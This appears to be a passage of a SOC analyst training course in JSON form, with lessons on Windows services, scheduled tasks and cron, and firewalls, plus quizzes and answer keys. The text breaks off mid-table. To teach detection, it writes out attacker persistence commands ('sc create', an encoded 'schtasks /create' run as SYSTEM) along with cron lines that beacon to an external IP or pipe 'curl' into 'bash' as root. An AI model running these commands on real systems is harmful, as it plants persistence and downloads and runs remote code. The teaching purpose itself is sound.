      "content": "### services.msc — the GUI\n\nThe **Services console** (`services.msc`) lists every registered service with its display name, status (running/stopped), and start type, and lets an admin start, stop, or reconfigure one. It is the everyday viewer, but like Registry Editor, it shows the current state only — not history.\n\n### sc.exe — the command line\n\nThe **`sc`** command queries and manages services from a shell, and its verbs are worth recognising in logs because attackers and admins use the identical syntax:\n\n```\nC:\\> sc query WinDefend\n\nSERVICE_NAME: WinDefend\n        STATE              : 4  RUNNING\n        START_TYPE         : 2   AUTO_START\n\nC:\\> sc create UpdSvc binPath= \"C:\\Users\\Public\\upd.exe\" start= auto\n[SC] CreateService SUCCESS\n```\n\n`sc query` inspects a known service (here, Windows Defender's, confirmed running and set to auto-start). `sc create` is the exact command shape behind malicious service persistence: a chosen name (`UpdSvc`, generic and unremarkable), a `binPath` pointing at a binary in a world-writable folder (`C:\\Users\\Public`), and `start= auto` so it survives every reboot. Seeing `sc create` (or `sc config` changing an existing service's `binPath`) in command-line telemetry, especially with a suspicious path, is a near-direct signal.\n\n### PowerShell\n\n```\nPS C:\\> Get-Service WinDefend | Select-Object Name, Status, StartType\nPS C:\\> New-Service -Name UpdSvc -BinaryPathName 'C:\\Users\\Public\\upd.exe' -StartupType Automatic\n```\n\n`Get-Service` is the read side; `New-Service` performs the same creation `sc create` does, just from PowerShell — another reason PowerShell script-block logging (Event ID 4104) complements service telemetry.\n\n### PsExec and remote service creation\n\nBecause PsExec-style lateral movement (mentioned earlier) works by remotely creating a service, the *target* of that service creation is frequently a different machine from the one the attacker's session is on — meaning you may see the **service-creation event on a machine where no interactive attacker session ever appears**, with the only trace being the remote authentication that preceded it (an admin-share connection and a logon type consistent with a network logon, Event ID 4624 type 3).\n\n### Why this matters for the SOC\n\nAs with the Registry, manual queries (`sc query`, `Get-Service`) tell you what a service looks like *right now* — useful for confirming a hypothesis (\"is `UpdSvc` still running?\") — while the Event ID **7045** and related logs from the earlier section tell you *when it appeared and what created it*. An analyst who can read both a live `sc query` output and a historical 7045 event can move fluidly between 'what is on this box today' and 'how did it get there'."
    },
    {
      "heading": "Worked Example: Catching PsExec-Style Lateral Movement via Service Creation",
      "content": "Put the chapter's ideas together with one walkthrough of a lateral-movement detection, the way a Tier-2 analyst would actually work it.\n\n### The trigger\n\nYour SIEM raises an alert: Event ID 7045 fired on `FILESRV02`, a file server that rarely sees new software installed.\n\n```\nEvent ID: 7045 (A service was installed in the system)\nComputer: FILESRV02\nService Name: PSEXESVC\nService File Name: %SystemRoot%\\PSEXESVC.exe\nService Type: user mode service\nService Start Type: demand start\nAccount: LocalSystem\n```\n\n### Step 1 — recognise the name\n\n`PSEXESVC` is not obfuscated at all — it is the *default* service name the Sysinternals **PsExec** tool creates on a target when it is used exactly as documented. That is either a legitimate administrator running PsExec, or an attacker using the same well-known technique. The service name alone cannot tell you which; context must.\n\n### Step 2 — check who connected, and how\n\nYou pull authentication events for `FILESRV02` around the same timestamp and find:\n\n```\nEvent ID: 4624 (An account was successfully logged on)\nLogon Type: 3 (Network)\nAccount Name: svc-backup\nSource Network Address: 10.14.30.51\n```\n\nA **network logon (type 3)** immediately before the service was created — consistent with PsExec's remote-connection step — from a workstation (`10.14.30.51`) using the account `svc-backup`, a **service account** that has no business initiating an administrative session from a user workstation.\n\n### Step 3 — check what the source machine was doing\n\nOn `10.14.30.51`, endpoint telemetry around the same time shows a PowerShell process with a base64-encoded command line, spawned a few minutes earlier by a Word document opened from an email attachment — the phishing chain from the very first lesson in this series.\n\n### Step 4 — the verdict\n\nThe pieces now form a single story: a phishing document ran PowerShell on a workstation, that PowerShell session obtained and used the `svc-backup` account's credentials, and PsExec-style service creation was used to pivot from that workstation onto a file server — classic **lateral movement**. None of the individual events (a service install, a network logon, a PowerShell process) was damning alone; the *sequence*, tied together by timestamps and account/host identifiers, is what turns four routine-looking log lines into a confirmed multi-host intrusion."
    }
  ],
  "keyTakeaways": [
    "A Windows service is a background program with no UI that usually starts at boot and runs under a service account (often the highly privileged LocalSystem) independent of any logged-in user — ideal machinery, and an ideal attacker persistence vehicle.",
    "The Service Control Manager (SCM) starts and tracks services (configured in the Registry under ...CurrentControlSet\\Services); start types range from Automatic (attacker's preference) to Disabled, and many services run as DLLs inside shared svchost.exe processes launched by services.exe.",
    "Attackers create malicious auto-start services (durable, privileged persistence), hijack existing services by changing their binary path, and use service creation for remote execution/lateral movement (PsExec) — svchost imitation from the wrong path/parent is a classic tell.",
    "Detect with Event ID 7045 (new service installed) as the headline signal — suspicious binary path, odd name, or PsExec-pattern lateral movement — plus 7034/7036 (state change), 4697, service-key registry changes, and sc.exe/PsExec command-line telemetry.",
    "sc.exe (sc query, sc create) and PowerShell (Get-Service, New-Service) are the hands-on tools behind these events; a worked PSEXESVC investigation shows how a service-creation event plus a preceding network logon (Event 4624 type 3) plus the source host's own process history together confirm lateral movement, when no single event would."
  ],
  "quiz": [
    {
      "question": "While investigating a possible intrusion you see Windows Event ID 7045 on a server, showing a newly installed service with a random-looking name whose binary is located in C:\\Users\\Public\\temp. Why is this significant?",
      "options": [
        {
          "label": "It is routine, because Windows automatically installs a new randomly-named service in a public temp folder every time any user simply logs on to the server.",
          "value": "a"
        },
        {
          "label": "Event 7045 records a new service installation, and a random name with a binary in a temp folder matches attacker persistence or PsExec-style lateral movement.",
          "value": "b"
        },
        {
          "label": "It shows a service was permanently deleted, so the alert simply confirms that cleanup of old software completed successfully and needs no further review.",
          "value": "c"
        },
        {
          "label": "It indicates the firewall was reconfigured, because service installation events are how Windows records inbound and outbound firewall rule changes.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Event ID 7045 fires when a new service is installed; a random-looking name with a binary in a user-writable temp folder is a strong indicator of malicious persistence or PsExec-style lateral movement, since legitimate services rarely look like that. Option a is false because Windows does not auto-create random services at logon. Option c is wrong because 7045 records installation, not deletion. Option d misattributes firewall changes to service-install events."
    },
    {
      "question": "You see a process named svchost.exe running from C:\\Users\\Alice\\AppData\\Local, and its parent process is not services.exe. Why is this suspicious?",
      "options": [
        {
          "label": "It is normal, because svchost.exe is designed to run from each user's AppData folder and is routinely launched by whatever application needs it at the time.",
          "value": "a"
        },
        {
          "label": "Legitimate svchost.exe runs from System32 and is launched by services.exe, so a copy from a user folder with the wrong parent is likely malware impersonating it.",
          "value": "b"
        },
        {
          "label": "It simply means the user manually started a background service, which is the standard supported way to add new Windows services to a machine.",
          "value": "c"
        },
        {
          "label": "It confirms the machine is fully patched, because only updated svchost.exe binaries are permitted to run from a user's AppData directory by design.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A legitimate svchost.exe lives in System32 and is always launched by services.exe (the SCM); a svchost running from a user's AppData folder with a different parent is a classic impersonation of a trusted system process, revealed by its wrong path and lineage. Option a is false because svchost does not run from AppData. Option c misdescribes how services are added. Option d invents a patching guarantee that has nothing to do with the observation."
    },
    {
      "question": "Event ID 7045 shows a service named PSEXESVC was installed on a file server, created right after a Logon Type 3 (network) authentication from a workstation using a service account. Why isn't the service name alone enough to call this malicious?",
      "options": [
        {
          "label": "PSEXESVC is a name PsExec creates whether used by a legitimate administrator or an attacker, so the surrounding logon and account context is what determines intent.",
          "value": "a"
        },
        {
          "label": "Because Event ID 7045 never actually records the service name, so PSEXESVC must have been guessed rather than read from the real log entry.",
          "value": "b"
        },
        {
          "label": "Because service names are encrypted in the event log, meaning PSEXESVC could actually be any name and analysts cannot trust what is displayed.",
          "value": "c"
        },
        {
          "label": "Because Logon Type 3 always indicates an interactive administrator physically sitting at the file server's own console, which fully explains the activity.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "PSEXESVC is the default, unobfuscated service name PsExec creates on a target, so seeing it does not by itself distinguish legitimate admin use from attacker lateral movement — you need surrounding context like the logon type, the account used, and whether that account's use makes sense, exactly as the worked example shows. Option b is false; 7045 does record the service name. Option c invents encryption that does not exist. Option d misdefines Logon Type 3, which is a network logon, not an interactive console logon."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/services/services",
    "https://attack.mitre.org/techniques/T1543/003/",
    "https://attack.mitre.org/techniques/T1569/002/",
    "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-scheduled-tasks-and-cron-jobs",
  "slug": "scheduled-tasks-and-cron-jobs",
  "title": "Scheduled Tasks and Cron Jobs",
  "topic": "Operating System Fundamentals",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Every operating system can be told to run a program automatically — at 3 a.m. every night, at every boot, or every ten minutes. On Windows this is done with Scheduled Tasks; on Linux with cron jobs. These schedulers are essential for legitimate automation like backups and updates, but they are also one of the most common ways attackers make their malware persistent and stealthy. This lesson explains how both schedulers work, why they are perfect for persistence, the actual commands (schtasks, crontab, systemctl) you use to inspect and create jobs on both platforms, how a SOC analyst detects a malicious task or cron entry, and a full worked investigation that walks a disguised Windows task from alert to confirmed compromise.",
  "sections": [
    {
      "heading": "Why Scheduling Exists",
      "content": "A **scheduler** is the part of an operating system that runs a chosen program automatically based on a **trigger** — a time, an event, or a recurring interval — without anyone having to launch it by hand. Every real environment depends on scheduling for routine automation: nightly backups, software updates, log rotation, cleanup jobs, and health checks all run on schedules so humans do not have to remember them.\n\nThe idea has two halves that are worth naming, because they apply to both Windows and Linux:\n\n- **A trigger** — *when* the task should run. This might be a specific time (\"2:00 a.m. daily\"), a recurring interval (\"every 15 minutes\"), or a system event (\"at startup,\" \"at user logon\").\n- **An action** — *what* should run. Usually a program, script, or command.\n\nPut simply, a scheduled job says \"**run this** (action) **whenever that happens** (trigger).\"\n\nThis simple, legitimate capability is exactly what makes schedulers so useful to attackers, and the theme runs through the whole lesson. If you can tell the operating system to run *your* program automatically and repeatedly, you have solved two of an intruder's core problems at once:\n\n- **Persistence** — surviving reboots and logoffs. A scheduled task set to run at startup relaunches the malware every time the machine boots, so a reboot no longer removes the attacker.\n- **Stealth and resilience** — a task that runs \"every hour\" quietly re-establishes a connection or re-launches a payload on its own, and it hides among the many legitimate scheduled jobs already on the system.\n\nBecause both Windows and Linux offer this, MITRE ATT&CK groups the abuse under a single technique, **Scheduled Task/Job (T1053)**, with sub-techniques for each platform. The next two sections cover the Windows and Linux mechanisms in turn, and the sections after cover the tools and detection of abuse on both."
    },
    {
      "heading": "Windows Scheduled Tasks",
      "content": "On Windows, scheduling is handled by the **Task Scheduler**, and individual jobs are called **scheduled tasks**. Each task pairs one or more **triggers** (when) with one or more **actions** (what to run), and the system executes the action whenever a trigger fires.\n\n**Triggers** on Windows are rich, which is part of why the feature is so abusable. A task can be set to run:\n\n- At a specific **time** or on a recurring schedule (daily, hourly, every N minutes).\n- **At system startup** — a favourite for persistence, since the task runs on every boot.\n- **At user logon** — running when a particular user (or any user) signs in.\n- On a **system event**, such as a specific log entry appearing.\n\n### Managing tasks\n\nUsers and admins create and view tasks with the graphical **Task Scheduler** app, or the command-line **`schtasks.exe`** (and PowerShell's scheduled-task commands). The definitions themselves are stored as XML files under `C:\\Windows\\System32\\Tasks` and referenced in the Registry. So `schtasks /create` on a command line is the CLI way to plant a task — and a common one in attacks.\n\n### Why attackers use scheduled tasks\n\nThey deliver everything an intruder wants: automatic execution, a choice of triggers (boot, logon, or interval), the ability to run under a chosen account (including highly privileged ones), and camouflage among the dozens of legitimate tasks Windows and installed software already register. An attacker might create a task named to look like a Windows or vendor task, set to run their payload at startup or every few minutes, giving them durable persistence and a self-healing foothold. MITRE tracks this as **Scheduled Task/Job: Scheduled Task (T1053.005)**.\n\nA recurring giveaway is the *action*: a legitimate maintenance task usually runs a recognisable program, while a malicious one often runs PowerShell with an encoded command, a script from a temp folder, or a suspicious binary. The action, the trigger, and the task's name together tell you whether a task belongs — which is exactly what the detection section builds on."
    },
    {
      "heading": "Linux Cron Jobs",
      "content": "On Linux (and Unix-like systems), the classic scheduler is **cron**, and the jobs it runs are **cron jobs**. A background service called the **cron daemon** wakes up every minute, checks whether any job is due, and runs the ones that are.\n\n### Where cron jobs live\n\nThere are several locations, and an analyst should know them because attackers hide in all of them:\n\n- **Per-user crontabs** — each user has their own list of jobs, edited with `crontab -e` and viewed with `crontab -l`.\n- **The system crontab** — `/etc/crontab` and files in `/etc/cron.d/`, which run system-wide jobs (often as root).\n- **The drop-in directories** — `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, and `/etc/cron.monthly/`, which run any script placed inside them on that cadence.\n\n### Cron syntax\n\nA cron entry begins with five time-and-date fields, then the command:\n\n```\n*  *  *  *  *   command-to-run\n│  │  │  │  │\n│  │  │  │  └─ day of week (0-7)\n│  │  │  └──── month (1-12)\n│  │  └─────── day of month (1-31)\n│  └────────── hour (0-23)\n└───────────── minute (0-59)\n```\n\nSo `0 3 * * *` means \"at 03:00 every day,\" and `*/10 * * * *` means \"every 10 minutes.\" An asterisk means \"every.\" Reading this syntax lets you tell at a glance how often a job runs — and an entry set to run every minute or every few minutes is a common beaconing/persistence pattern.\n\n### Related mechanisms\n\nModern Linux also has **systemd timers**, which do a similar job through systemd units, and the **`at`** command for one-off scheduled runs. Attackers use these too, so they are worth knowing alongside classic cron.\n\n### Why attackers use cron\n\nExactly as on Windows: a cron entry gives automatic, recurring execution that survives reboots, can run as root, and blends in with the legitimate cron jobs every Linux system already has. MITRE tracks this as **Scheduled Task/Job: Cron (T1053.003)**. A malicious cron job frequently runs a shell command that pulls down and executes a payload (`curl ... | bash`) or re-opens a reverse shell on a tight interval — self-healing persistence in one line."
    },
    {
      "heading": "Command-Line Tools: schtasks, crontab, and systemd Timers",
      "content": "### schtasks.exe — creating and inspecting tasks from the command line\n\n```\nC:\\> schtasks /query /tn \"\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan\" /v /fo list\n\nTaskName:       \\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan\nTask To Run:    rundll32.exe usoapi.dll,UsoInitiateOOBEUpdateScan\nStart In:       N/A\n\nC:\\> schtasks /create /tn \"WinUpdateCheck\" /tr \"powershell -enc SQBFAFgA...\" /sc onstart /ru SYSTEM\nSUCCESS: The scheduled task \"WinUpdateCheck\" has successfully been created.\n```\n\nThe query shows a legitimate built-in Windows update task, running a recognisable DLL through `rundll32`. The `/create` example is the shape attackers actually use: a name deliberately chosen to sound legitimate (`WinUpdateCheck`), an encoded PowerShell payload as the action (`/tr`), a trigger of `onstart` (system boot — maximum persistence), and `/ru SYSTEM` to run with the highest local privilege. Every one of those flags maps directly to the trigger/action/account concepts from earlier in this lesson, and every one of them is captured in the resulting Event ID 4698.\n\n### PowerShell's ScheduledTasks module\n\n```\nPS C:\\> Get-ScheduledTask -TaskName \"WinUpdateCheck\" | Get-ScheduledTaskInfo\nPS C:\\> Register-ScheduledTask -TaskName \"WinUpdateCheck\" -Action $action -Trigger $trigger -User SYSTEM\n```\n\nSame two ideas — read (`Get-ScheduledTask`) and create (`Register-ScheduledTask`) — expressed as PowerShell objects instead of flags, which is why 4104 script-block logging is again a valuable companion for catching this route.\n\n### Linux: crontab and systemctl\n\n```\n$ crontab -l\n0 2 * * * /home/webapp/scripts/backup.sh\n\n$ crontab -l -u www-data\n*/2 * * * * curl -s http://185.10.10.10/beacon.php?id=$(hostname) -o /dev/null\n\n$ systemctl list-timers --all\nNEXT                 LEFT   UNIT               ACTIVATES\nSat 2026-08-15 03:00 12h    logrotate.timer    logrotate.service\n```\n\n`crontab -l` lists the current user's jobs; adding `-u <user>` (as root) inspects *another* user's crontab — exactly how an analyst would check a service account like `www-data` for planted persistence. The second listing is a live example of the beaconing pattern flagged earlier: every two minutes, silently call out to an external IP, encoding the hostname in the URL so the attacker's server can tell which compromised host is checking in. `systemctl list-timers` is the equivalent read for the modern systemd-timer mechanism.\n\n### Why hands-on familiarity matters\n\nThese are the exact commands you will type, or see in command-line telemetry, when triaging a persistence alert — a `schtasks /create` or `crontab -e` line in your EDR's process history is often the single clearest piece of evidence that a task or cron entry was deliberately planted, as opposed to something that has simply always been there."
    },
    {
      "heading": "Detecting Malicious Scheduled Jobs",
      "content": "Because scheduled tasks and cron jobs are such reliable persistence, detecting their creation and modification is essential SOC work — and both platforms leave traces.\n\n**On Windows:**\n\n- **Event ID 4698** — *a scheduled task was created* — is the headline signal, capturing the task name and its action. A new task running PowerShell with an encoded command, or a binary from a temp folder, is a strong indicator. Related events include **4699** (task deleted), **4700/4701** (enabled/disabled), and **4702** (task updated).\n- **Task Scheduler operational log** entries (such as event **106** for task registration) provide an additional trail.\n- **File and process telemetry** — creation of XML files under `C:\\Windows\\System32\\Tasks`, and command lines showing **`schtasks /create`** or PowerShell scheduling, tied back to the responsible parent process.\n\n**On Linux:**\n\n- **Changes to crontab files and cron directories** — modifications to `/etc/crontab`, `/etc/cron.d/`, the `cron.*` drop-in folders, or user crontabs. File-integrity monitoring on these paths is a core detection.\n- **Process/audit logs** — the Linux **auditd** or EDR telemetry showing a user editing crontabs (`crontab -e`) or the **cron daemon spawning** an unexpected child process (a cron job launching `bash`, `curl`, or a script from `/tmp`).\n- **The job's action** — a cron line that pipes a download into a shell, or runs on a very tight interval, stands out.\n\n### How to hunt, on either platform\n\nThe unifying method is to treat **job creation and modification as inherently interesting**, then judge each by three questions: *When* does it run (startup, logon, or a suspiciously tight interval)? *What* does it run (a recognisable program, or PowerShell-encoded/temp-folder/shell-download activity)? And *who/what created it* (tied to a suspicious process or user)? Legitimate scheduled jobs are usually installed by software and run recognisable programs on sensible schedules, so a job that fails those tests — an odd name, a hidden action, an aggressive interval, created by an unexpected process — is exactly the persistence a SOC is looking for. Correlate the scheduled-job event with the surrounding process tree and file activity, and you catch the attacker planting their foothold on both Windows and Linux."
    },
    {
      "heading": "Worked Example: A Malicious Scheduled Task Chain",
      "content": "### The alert\n\nEvent ID 4698 fires on a workstation:\n\n```\nEvent ID: 4698 (A scheduled task was created)\nTask Name: \\MicrosoftEdgeUpdateTaskMachineUA\nCommand: powershell.exe -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATw...\nTrigger: At log on of any user\nAuthor: CORP\\j.chen\n```\n\n### Step 1 — spot the impersonation\n\nThe task name, `MicrosoftEdgeUpdateTaskMachineUA`, is deliberately near-identical to the real Microsoft Edge update task Windows legitimately creates — a masquerading move borrowed from the process-tree lesson, applied to a task name instead of a process name. The giveaway is the **action**: a genuine Edge update task runs Edge's own updater binary, not `powershell.exe` with a hidden window and an encoded command.\n\n### Step 2 — check the trigger\n\n\"At log on of any user\" means this task fires every single time *anyone* signs in to this machine — a broad, repeat-execution trigger, consistent with an attacker wanting resilient, frequent re-execution rather than a one-off run.\n\n### Step 3 — decode and correlate\n\nDecoding the Base64 command reveals a short downloader that reaches out to an external domain for a second-stage payload. Pivoting to network telemetry confirms outbound connections from this host to that exact domain, minutes after each logon — matching the trigger precisely.\n\n### Step 4 — check the author field\n\nThe task's **Author** is `CORP\\j.chen`, an ordinary employee account, not an administrator or a software installer — meaning this task was created under a *standard user's* context, not by a legitimate software deployment (which normally runs as SYSTEM or through an installer). Combined with the account owner reporting a suspicious email that morning, the picture is clear: j.chen's session was compromised (likely via that email), and the attacker used it to plant a disguised, logon-triggered scheduled task as durable persistence.\n\n### Step 5 — the verdict and the parallel\n\nNotice how closely this mirrors the earlier cron example (`*/5 * * * * curl ... | bash`): different operating system, different scheduler, but the same underlying attacker logic — abuse a trusted automatic-execution mechanism, disguise the name, choose a trigger that guarantees repeated execution, and hide the true action behind obfuscation (Base64 on Windows, a piped shell command on Linux). Once you recognise that shared pattern, a scheduled-task or cron alert on either platform is triaged with the same three questions from the earlier detection section: when does it run, what does it really do, and who or what created it."
    }
  ],
  "keyTakeaways": [
    "Schedulers run a program automatically based on a trigger (time, interval, boot, or logon); Windows uses Scheduled Tasks (Task Scheduler / schtasks.exe) and Linux uses cron jobs (cron daemon) — both essential for automation and both abused for persistence under MITRE T1053.",
    "Windows tasks pair triggers (startup and logon are attacker favourites) with actions, are managed via Task Scheduler/schtasks and stored as XML under System32\\Tasks; malicious tasks often run PowerShell-encoded commands or temp-folder binaries (T1053.005).",
    "Linux cron jobs live in user crontabs, /etc/crontab, /etc/cron.d, and cron.hourly/daily/weekly/monthly; the five-field syntax (min hour dom mon dow) reveals cadence, and tight intervals or 'curl | bash' actions signal abuse (T1053.003), alongside systemd timers and at.",
    "schtasks /create and Register-ScheduledTask (Windows) and crontab -e / crontab -u and systemctl list-timers (Linux) are the exact commands behind both legitimate automation and attacker persistence, and they are what you look for in command-line telemetry.",
    "Detect with Windows Event 4698 (task created) plus 4699/4702 and schtasks command lines, and on Linux with file-integrity monitoring of cron paths plus auditd/EDR showing crontab edits or the cron daemon spawning shells — judging each job by when it runs, what it runs, and who created it, as a full worked example (a disguised, logon-triggered task with a compromised employee as Author) demonstrates."
  ],
  "quiz": [
    {
      "question": "On a Linux server you find a new entry in /etc/cron.d that reads: */5 * * * * root curl -s http://185.x.x.x/p | bash. Why is this a strong indicator of malicious persistence?",
      "options": [
        {
          "label": "It is a normal system backup, because the */5 schedule means it runs only once every five days and root is the standard account for backups.",
          "value": "a"
        },
        {
          "label": "It runs every 5 minutes as root, downloading and executing a remote script, which gives an attacker self-healing, reboot-surviving persistence.",
          "value": "b"
        },
        {
          "label": "It disables cron entirely, because piping curl into bash overwrites the cron daemon and prevents any scheduled jobs from ever running again.",
          "value": "c"
        },
        {
          "label": "It is harmless test output, because cron entries beginning with */5 are comments that Linux ignores and never actually executes as commands.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The `*/5 * * * *` schedule means every 5 minutes, running as root, and `curl -s ... | bash` downloads and immediately executes a remote script — recurring, privileged, self-healing persistence that survives reboots, a classic cron abuse (T1053.003). Option a misreads */5 as every five days and mislabels it a backup. Option c invents a nonexistent effect. Option d is false because */5 entries are active schedules, not comments."
    },
    {
      "question": "Which Windows event most directly signals that an attacker has created a scheduled task for persistence, and what should you examine about it?",
      "options": [
        {
          "label": "Event ID 4624, examining the logon type, because scheduled-task creation is recorded as an interactive logon by the SYSTEM account.",
          "value": "a"
        },
        {
          "label": "Event ID 4698, examining the task's action and trigger, because it records a scheduled task being created including what it runs and when.",
          "value": "b"
        },
        {
          "label": "Event ID 7045, examining the binary path, because scheduled tasks and Windows services are recorded by the identical event on modern systems.",
          "value": "c"
        },
        {
          "label": "Event ID 4104, examining the script block, because every scheduled task is internally stored and logged as a PowerShell script block on creation.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Event ID 4698 records the creation of a scheduled task, including its action (what runs) and trigger (when), so examining those reveals whether it is malicious — for example PowerShell-encoded commands or a temp-folder binary set to run at startup. Option a is wrong because 4624 is a logon event, not task creation. Option c confuses scheduled tasks with services (7045). Option d wrongly claims all tasks are stored as PowerShell script blocks."
    },
    {
      "question": "A scheduled task named MicrosoftEdgeUpdateTaskMachineUA triggers 'at logon of any user' and runs a hidden, Base64-encoded PowerShell command. Its Author field shows a standard employee account, not an installer or admin. Why does the Author field matter here?",
      "options": [
        {
          "label": "It proves the task is legitimate, because only Microsoft's own update installer is permitted to write to the Author field on a Windows task.",
          "value": "a"
        },
        {
          "label": "It shows the task was created under a standard user's context rather than by software deployment, consistent with the user's session being compromised and abused.",
          "value": "b"
        },
        {
          "label": "It records which antivirus engine last scanned the task, so a standard user in that field means the antivirus scan simply failed.",
          "value": "c"
        },
        {
          "label": "It is randomly generated by Windows for every scheduled task and therefore carries no investigative meaning regardless of which account it displays.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Legitimate software installs (including real Microsoft update tasks) are normally created by an installer or SYSTEM, not a standard employee account, so an Author of an ordinary user alongside a disguised name and hidden encoded command points to that user's session being compromised and misused to plant persistence — matching the phishing indicators found alongside it. Option a is false; Author is not restricted to Microsoft's installer. Option c invents an antivirus-scan meaning the field does not have. Option d wrongly dismisses Author as meaningless; it reliably records who/what created the task."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1053/005/",
    "https://attack.mitre.org/techniques/T1053/003/",
    "https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page",
    "https://man7.org/linux/man-pages/man5/crontab.5.html"
  ],
  "xp": 230,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-firewall-fundamentals",
  "slug": "firewall-fundamentals",
  "title": "Firewall Fundamentals",
  "topic": "Network Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "A firewall is the oldest and most familiar network defence, the gatekeeper that decides which traffic is allowed to pass and which is turned away. Yet many analysts use firewall logs every day without a clear picture of how a firewall actually makes those decisions. This beginner lesson builds that picture from the ground up: what a firewall is, how it evaluates traffic with rules, the difference between stateless and stateful filtering and modern application-aware firewalls, real rule syntax across platforms (iptables, Windows Firewall, enterprise rule tables), where firewalls sit in a network, how a SOC analyst reads firewall logs to catch attacks — especially the outbound traffic that betrays a compromise — and a full worked example of spotting command-and-control beaconing hiding inside perfectly 'allowed' traffic.",
  "sections": [
    {
      "heading": "What a Firewall Is and How It Decides",
      "content": "A **firewall** is a security device or piece of software that controls network traffic by deciding, for each connection, whether to **allow** it or **block** it based on a set of **rules**. It is the checkpoint between two networks — classically between your trusted internal network and the untrusted internet — inspecting traffic trying to cross and permitting only what the rules approve.\n\nThe real-life analogy is a **security guard at a building entrance with a rulebook**. Everyone approaching is checked against the rules: employees with the right badge pass, unexpected visitors are turned away. The firewall does this for network packets, thousands of times a second.\n\n**How a firewall decides** comes down to matching each connection against its **rulebase** — an ordered list of rules. Each rule typically matches on a handful of properties, often called the **five-tuple**:\n\n- **Source IP** — where the traffic is coming from.\n- **Destination IP** — where it is going.\n- **Source and destination port** — which service is involved (recall ports label services; e.g. 443 is HTTPS, 22 is SSH).\n- **Protocol** — TCP, UDP, and so on.\n\nA rule says, in effect, \"traffic matching *these* properties is allowed (or denied).\" For example: \"allow TCP to destination port 443 from the internal network\" lets users browse the web, while \"deny all inbound to port 3389\" blocks external Remote Desktop.\n\nTwo principles govern how rules are applied, and both matter to an analyst:\n\n- **Rules are evaluated in order**, and usually the *first* matching rule wins. So rule order changes behaviour.\n- **Default deny.** A well-configured firewall ends with an implicit rule that **blocks anything not explicitly allowed**. This \"deny by default\" stance means you decide what *is* permitted and everything else is refused — the opposite of allowing everything and blocking known-bad. Understanding default-deny is key to reading logs: a blocked connection may simply be traffic that matched no allow rule.\n\nWith this model — match the connection's properties against an ordered rulebase, allow or deny, default to deny — you can already interpret the core of any firewall's behaviour. The next section refines it by looking at *how deeply* different firewalls inspect."
    },
    {
      "heading": "Stateless, Stateful, and Next-Generation Firewalls",
      "content": "Firewalls differ in **how deeply they understand the traffic they filter**, and the three generations are worth knowing because they explain what a given firewall can and cannot catch.\n\n### Packet filtering (stateless)\n\nThe earliest firewalls examine each packet **in isolation**, checking its five-tuple against the rules with no memory of what came before. This is fast but limited: because it does not track the state of a connection, it cannot easily tell a legitimate reply apart from an unsolicited packet crafted to look like one. A stateless firewall is like a guard who checks each person's badge but remembers nothing about who is already inside.\n\n### Stateful inspection\n\nThe major improvement, and the norm for decades, is the **stateful firewall**, which **tracks the state of each connection**. When it allows an outbound request, it remembers that connection and automatically permits the matching reply, while still blocking unsolicited inbound traffic. This connection awareness is why you generally write rules for the *initiating* direction and trust the firewall to handle the return traffic. A stateful firewall is a guard who remembers who they let in, so returning visitors are recognised and unexpected ones are still stopped.\n\n### Next-Generation Firewalls (NGFW)\n\nModern firewalls go further, adding **application-awareness and deeper inspection**. An NGFW can identify the *application* inside the traffic (not just the port), inspect content, integrate threat intelligence, and often decrypt and examine encrypted traffic. This matters because attackers hide inside allowed ports — malware talking out over port 443 looks like normal web traffic to a simple firewall, but an NGFW can often tell it apart by behaviour and content.\n\n### Host vs network firewalls\n\nFirewalls also differ by *where* they run. A **network firewall** guards the boundary between whole networks (protecting the organisation at its edge). A **host-based firewall** runs on an individual machine, controlling that one computer's traffic — for example the **Windows Defender Firewall**, or **iptables/nftables** on Linux. Both matter to an analyst: the network firewall shows traffic crossing the perimeter, while host firewalls can contain a compromised machine or reveal local connection attempts.\n\nKnowing which kind of firewall produced a log tells you how much to trust it: a stateless device sees less than a stateful one, and an NGFW may give you application-level detail a basic filter never could."
    },
    {
      "heading": "Firewall Rules in Practice: Syntax Across Platforms",
      "content": "Every platform expresses the same five-tuple-plus-action idea from the first section, just with different syntax. Seeing several side by side makes the underlying model click.\n\n**Linux iptables (classic, still widely deployed):**\n\n```\n$ iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 3389 -j DROP\n$ iptables -A OUTPUT -p tcp -d 10.0.0.0/8 --dport 443 -j ACCEPT\n```\n\nRead the first as: *append (`-A`) to the INPUT chain (inbound), protocol TCP, from any source (`0.0.0.0/0`), to destination port 3389 (RDP), jump to DROP.* This is the dangerous-misconfiguration example from earlier, expressed as a rule that correctly blocks it instead. The second allows outbound HTTPS to the internal 10.0.0.0/8 range.\n\n**Linux nftables (the modern replacement):**\n\n```\n# nft add rule inet filter input tcp dport 3389 drop\n```\n\nSame idea, newer syntax, and the direction of the trend across the industry.\n\n**Windows Firewall (netsh):**\n\n```\nC:\\> netsh advfirewall firewall add rule name=\"Block RDP Inbound\" dir=in action=block protocol=TCP localport=3389\n```\n\nAgain, the same five-tuple concept: direction (`dir=in`), action (`block`), protocol, and port — just Windows' own command shape for the host-based firewall mentioned earlier.\n\n**Enterprise NGFW rule tables (conceptually, e.g. Palo Alto / Check Point style):**\n\n| # | Source | Destination | Service | Action |\n|---|--------|-------------|---------|--------|\n| 1 | Internal_Net | Any | HTTPS | Allow |\n| 2 | Any | 